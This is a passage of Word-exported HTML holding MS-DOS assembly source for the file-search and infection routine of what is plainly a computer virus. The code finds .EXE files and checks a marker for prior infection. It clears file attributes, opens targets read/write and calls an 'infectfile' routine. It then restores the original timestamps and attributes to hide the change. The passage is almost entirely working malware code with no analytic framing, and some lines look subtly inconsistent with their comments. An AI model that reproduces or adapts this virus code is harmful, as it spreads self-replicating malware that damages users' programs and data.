style="mso-spacerun: yes">     </span>[diskdtaseg],es<span style="mso-spacerun:
yes">           </span>;save old segment<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>[diskdtaofs],bx<span style="mso-spacerun:
yes">           </span>;save old offset<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,offset filedata<span
style="mso-spacerun: yes">        </span>;offset of where to hold new dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,1ah<span style="mso-spacerun:
yes">                    </span>;set dta address<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>scandir:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>mov<span
style="mso-spacerun: yes">     </span>cx,07h<span style="mso-spacerun:
yes">                    </span>;find any attribute<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,offset filespec<span
style="mso-spacerun: yes">        </span>;point dx to &quot;*.EXE&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,4eh<span style="mso-spacerun:
yes">                    </span>;find first file function<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun: yes"> 
</span><span style="mso-spacerun: yes">                     </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>cmp<span
style="mso-spacerun: yes">     </span>ax,12h<span style="mso-spacerun:
yes">                    </span>;was file found?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>jne<span
style="mso-spacerun: yes">     </span>transform<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>nextexe:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,4fh<span style="mso-spacerun:
yes">                    </span>;find next file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>cmp<span
style="mso-spacerun: yes">     </span>ax,12h<span style="mso-spacerun:
yes">                    </span>;none found<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>jne<span
style="mso-spacerun: yes">     </span>transform<span style="mso-spacerun:
yes">                 </span>;found see what we can do<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,offset rootdir<span
style="mso-spacerun: yes">         </span>;move dx to change to root directory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,3bh<span style="mso-spacerun:
yes">                    </span>;change directory to root<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">   </span>mov<span style="mso-spacerun: yes">    
</span>ah,1ah<span style="mso-spacerun: yes">                    </span>;set
dta address<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ds,[diskdtaseg]<span style="mso-spacerun:
yes">           </span>;restore old segment<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,[diskdtaofs]<span style="mso-spacerun:
yes">           </span>;restore old offset<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>jmp<span
style="mso-spacerun: yes">     </span>dirloop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>quit:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>jmp<span
style="mso-spacerun: yes">     </span>rollout<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>transform:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,2fh<span style="mso-spacerun:
yes">                    </span>;temporally store dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>[tempseg],es<span style="mso-spacerun:
yes">              </span>;save old segment<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>[tempofs],bx<span style="mso-spacerun:
yes">              </span>;save old offset<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx, offset filedata + filename<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>bx,offset filedata<span
style="mso-spacerun: yes">               </span>;save file...<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,[bx]+filedate<span
style="mso-spacerun: yes">          </span>;date<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>orig_date,ax<span style="mso-spacerun:
yes">              </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,[bx]+filetime<span
style="mso-spacerun: yes">          </span>;time<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>orig_time,ax<span style="mso-spacerun:
yes">              </span>;<span style="mso-spacerun: yes">    </span>and<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,[bx]+fileattr<span
style="mso-spacerun: yes">          </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,4300h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>orig_attr,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,4301h<span style="mso-spacerun:
yes">                  </span>;change attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>xor<span
style="mso-spacerun: yes">     </span>cx,cx<span style="mso-spacerun:
yes">                     </span>;clear attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">         </span><span style="mso-spacerun: yes">              </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,3d00h<span style="mso-spacerun:
yes">                  </span>;open file - read<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>jc<span
style="mso-spacerun: yes">      </span>fixup<span style="mso-spacerun:
yes">                     </span>;error - find another file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>handle,ax<span style="mso-spacerun:
yes">                 </span>;save handle<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,3fh<span style="mso-spacerun:
yes">     </span><span style="mso-spacerun: yes">               </span>;read
from file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>bx,handle<span style="mso-spacerun:
yes">                 </span>;move handle to bx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>cx,02h<span style="mso-spacerun:
yes">                    </span>;read 2 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,offset idbuffer<span
style="mso-spacerun: yes">        </span>;save to buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,3eh<span style="mso-spacerun:
yes">                    </span>;close file for now<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>bx,handle<span style="mso-spacerun:
yes">                 </span>;load bx with handle<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>bx, idbuffer<span style="mso-spacerun:
yes">              </span>;fill bx with id string<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>cmp<span
style="mso-spacerun: yes">     </span>bx,03ebh<span style="mso-spacerun:
yes">                  </span>;infected?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>jne<span
style="mso-spacerun: yes">     </span>doit<span style="mso-spacerun:
yes">                      </span>;same - find another file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>fixup:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,1ah<span style="mso-spacerun:
yes">                    </span>;set dta address<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ds,[tempseg]<span style="mso-spacerun:
yes">              </span>;restore old segment<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,[tempofs]<span style="mso-spacerun:
yes">              </span>;restore old offset<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>jmp<span
style="mso-spacerun: yes">     </span>nextexe<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>doit:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx, offset filedata + filename<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,3d02h<span style="mso-spacerun:
yes">                  </span>;open file read/write access<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>handle,ax<span style="mso-spacerun:
yes">               </span><span style="mso-spacerun: yes">  </span>;save
handle<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>call<span
style="mso-spacerun: yes">    </span>infectfile<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>;mov<span
style="mso-spacerun: yes">     </span>ax,3eh<span style="mso-spacerun:
yes">                    </span>;close file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>;int<span
style="mso-spacerun: yes">     </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>rollout:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,5701h<span style="mso-spacerun:
yes">                  </span>;restore original<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>bx,handle<span style="mso-spacerun:
yes">                 </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>cx,orig_time<span style="mso-spacerun:
yes">           </span><span style="mso-spacerun: yes">   </span>;time and<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,orig_date<span style="mso-spacerun:
yes">              </span>;date<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ax,4301h<span style="mso-spacerun:
yes">                  </span>;restore original attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>cx,orig_attr<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,offset filedata + filename<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">   </span>;mov<span style="mso-spacerun: yes">    
</span>bx,handle<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>;mov<span
style="mso-spacerun: yes">     </span>ax,3eh<span style="mso-spacerun:
yes">                   </span>;close file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>;int<span
style="mso-spacerun: yes">     </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,3bh<span style="mso-spacerun:
yes">                    </span>;try to fix this<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>dx,offset rootdir<span
style="mso-spacerun: yes">         </span>;for speed<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>int<span
style="mso-spacerun: yes">     </span>21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
style="mso-spacerun: yes">     </span>ah,3bh<span style="mso-spacerun:
yes">                    </span>;change directory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>mov<span
